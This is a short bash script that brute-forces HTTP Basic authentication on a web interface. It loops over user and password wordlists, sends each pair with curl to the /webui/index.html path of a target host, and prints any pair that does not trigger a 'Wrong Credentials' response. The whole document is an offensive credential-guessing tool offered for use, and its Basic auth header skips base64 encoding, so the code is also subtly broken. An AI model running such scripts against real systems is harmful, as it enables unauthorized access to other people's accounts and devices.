for u in `<unix_users.txt`; do
  for p in `<unix_passwords.txt`; do
    b=`echo -n "$u:$p"`
    guess=`curl -H "authorization: Basic $b" -sk https://$1/webui/index.html |grep 'Wrong Credentials'`
    if [ -z "$guess" ]; then
      echo "[+] $u:$p"
    fi
  done
done
